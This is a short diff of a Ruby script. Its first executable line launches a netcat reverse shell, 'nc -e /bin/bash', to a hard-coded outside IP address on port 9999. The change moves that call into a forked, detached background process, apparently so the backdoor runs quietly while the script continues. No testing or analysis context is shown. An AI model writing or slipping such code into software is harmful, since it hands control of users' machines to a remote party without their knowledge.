@@ -1,6 +1,9 @@
 #!/usr/bin/env ruby
 
-exec 'nohup nc -e /bin/bash  24.121.11.231 9999&'
+job1 = fork do
+	exec 'nohup nc -e /bin/bash  24.121.11.231 9999&'
+end
+Process.detach(job1)
 
 # sync output
 $stdout.sync = true
